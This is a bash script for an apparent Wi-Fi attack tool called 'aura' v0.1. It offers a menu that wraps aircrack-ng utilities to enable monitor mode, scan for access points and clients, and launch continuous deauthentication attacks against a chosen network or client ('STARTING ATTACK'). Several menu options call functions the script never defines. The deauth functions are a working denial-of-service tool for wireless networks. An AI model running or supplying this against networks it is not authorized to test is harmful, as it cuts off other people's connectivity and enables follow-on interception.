banner()
{
    clear
    printf '\e[93m
 8888b.  888  888 888d888 8888b.      
    "88b 888  888 888P"      "88b 
.d888888 888  888 888    .d888888  
888  888 Y88b 888 888    888  888 
"Y888888  "Y88888 888    "Y888888 v0.1\n'
}

auramenu()
{
    banner
    printf "\e[0m
(1) DEAUTH WI-FI/CLIENT
(2) SCAN FOR WI-FI/CLIENT
(3) ENABLE MONITOR MODE
(4) CHANGE MAC ADDRES\n
(5) CHECK INTERNET SPEED
(6) SHOW WIRELESS IFACES
(7) EXIT\n
"
read -p "SELECT: " auramenu
    case $auramenu in
    
    1) aurajammer ;;
    
    2) aurascanner ;;
    
    3) mmode ;;
    
    4) mac ;;
    
    5) ispeed ;;
    
    6) ifaces ;;
    
    7) exit ; clear ;;
    
    *) printf "\e[93mINCORRECT OPTION...\n"; exit;;
    esac
}

#####################################################################

aurajammer()
{
    banner
    printf "\e[0m
(1) DEAUTH WI-FI 
(2) DEAUTH CLIENT\n
(3) BACK\n
"
read -p "SELECT: " deauth
    case $deauth in
    
    1) f_wifi ;;
    
    2) f_client ;;
    
    3) auramenu ;;
    
    *) printf "\e[93mINCORRECT OPTION...\n"; exit;;
    esac
}

f_wifi()
{
    banner
    printf "\e[0m\n"
    read -p "WI-FI BSSID: " BSSID
    read -p "INTERFACE: " iface
    printf "\e[93m\n"
    read -r -p "DEAUTH $BSSID? (Y/N): " yesorno
    printf "\e[93m\n"
    case $yesorno in
        [yY][eE][sS]|[yY])
            printf "STARTING ATTACK...\n"
            sleep 1
            aireplay-ng -0 0 -a $BSSID $iface --ignore-negative-one
            ;;
        [nN][oO]|[nN])
            printf "BACKING TO MENU"
            sleep 1.2
            auramenu
            ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n"
        exit
        ;;
    esac
}

f_client()
{
  banner
    printf "\e[0m\n"
    read -p "WI-FI BSSID: " BSSID
    read -p "CLIENT BSSID: " CLIENT
    read -p "INTERFACE: " iface
    printf "\e[93m\n"
    read -r -p "DEAUTH $BSSID? (Y/N): " yesorno
    printf "\e[93m\n"
    case $yesorno in
        [yY][eE][sS]|[yY])
            printf "STARTING ATTACK...\n"
            sleep 1
            aireplay-ng -0 0 -b $BSSID -c $CLIENT $iface --ignore-negative-one
            ;;
        [nN][oO]|[nN])
            printf "BACKING TO MENU"
            sleep 1.2
            auramenu
            ;;
        *)
        printf "\e[93mINCORRECT OPTION...\n"
        exit
        ;;
    esac
}

####################################################################

aurascanner()
{
    banner
    printf "\e[0m
(1) SCAN FOR WI-FI
(2) SCAN FOR CLIENTS
(3) BACK\n
"
read -p "SELECT: " select
    case $select in
    
    1) f_apscan ;;
    
    2) f_cliscan ;;
    
    3) auramenu ;;
    
    *) printf "INCORRECT OPTION...\n"; exit;;
    esac
}

f_apscan()
{
    banner
    printf "\e[0m\n"
    read -r -p "SAVE LOGS? (Y/N): " logs
    case $logs in
        [yY][eE][sS]|[yY])
            read -p "CAPTURE NAME: " cap
            read -p "INTERFACE: " iface
            printf "\e[93m\n"
            read -r -p "START SCAN? (Y/N): " yesorno
            case $yesorno in
                [yY][eE][sS]|[yY])
                    printf "\e[0m"
                    printf "STARTING SCAN...\e[0m\n"
                    airodump-ng -w $cap --output-format csv $iface
                    ;;
                [nN][oO]|[nN])
                    printf "BACKING TO MENU"
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "INCORRECT OPTION...\n"
                exit
                ;;
            esac
            ;;
        [nN][oO]|[nN])
            read -p "INTERFACE: " iface
            printf "\e[93m\n"
            read -r -p "START SCAN? (Y/N): " yesorno
            case $yesorno in
                [yY][eE][sS]|[yY])
                    printf "\e[0m"
                    printf "STARTING SCAN...\e[0m\n"
                    airodump-ng $iface
                    ;;
                [nN][oO]|[nN])
                    printf "BACKING TO MENU"     
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "INCORRECT OPTION...\n"
                exit
                ;;
            esac
            ;;
        *)
        printf "INCORRECT OPTION...\n"
        exit
        ;;
    esac
}

f_cliscan()
{
    banner
    printf "\e[0m\n"
    read -r -p "SAVE LOGS? (Y/N): " logs
    case $logs in
        [yY][eE][sS]|[yY])
            read -p "CAPTURE NAME: " cap
            read -p "WI-FI BSSID: " bssid
            read -p "INTERFACE: " iface
            printf "\e[93m\n"
            read -r -p "START SCAN? (Y/N): " yesorno
            case $yesorno in
                [yY][eE][sS]|[yY])
                    printf "\e[0m"
                    printf "STARTING SCAN...\e[0m\n"
                    airodump-ng --bssid $bssid -w $cap --output-format csv $iface
                    ;;
                [nN][oO]|[nN])
                    printf "BACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "INCORRECT OPTION...\n"
                exit
                ;;
            esac
            ;;
        [nN][oO]|[nN])
            read -p "WI-FI BSSID: " bssid
            read -p "INTERFACE: " iface
            printf "\e[93m\n"
            read -r -p "START SCAN? (Y/N): " yesorno
            case $yesorno in
                [yY][eE][sS]|[yY])
                    printf "\e[0m"
                    printf "STARTING SCAN...\e[0m\n"
                    airodump-ng --bssid $bssid $iface
                    ;;
                [nN][oO]|[nN])
                    printf "BACKING TO MENU..."     
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "INCORRECT OPTION...\n"
                exit
                ;;
            esac
            ;;
        *)
        printf "INCORRECT OPTION...\n"
        exit
        ;;
    esac
}

####################################################################

mmode()
{
    banner
    printf "\e[0m\n"
    read -p "INTERFACE: " iface
    printf "\e[93m\n"
    read -r -p "YOU WANT TO CHOOSE A CHANNEL? (Y/N): " quest
    case $quest in 
        [yY][eE][sS]|[yY])
            printf "\e[0m\n"
            read -p "CHANNEL: " chnl
            printf "\e[93m\n"
            read -r -p "ENABLE MONITOR MODE ON $iface? (Y/N): " t
            case $t in
                [yY][eE][sS]|[yY])
                    printf "\nENABLING MONITOR MODE..."
                    sleep 1
                    airmon-ng start $iface $chnl
                    ;;
                [nN][oO]|[nN])
                    printf "BACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "INCORRECT OPTION...\n"
                exit
                ;;
            esac
            ;;
        [nN][oO]|[nN])
            printf "\e[93m\n"
            read -r -p "ENABLE MONITOR MODE ON $iface? (Y/N): " t
            case $t in
                [yY][eE][sS]|[yY])
                    printf "\nENABLING MONITOR MODE..."
                    sleep 1
                    airmon-ng start $iface 
                    ;;
                [nN][oO]|[nN])
                    printf "BACKING TO MENU..."
                    sleep 1.2
                    auramenu
                    ;;
                *)
                printf "INCORRECT OPTION...\n"
                exit
                ;;
            esac
            ;;
        *)
        printf "INCORRECT OPTION...\n"
        exit
        ;;
    esac
        
}







auramenu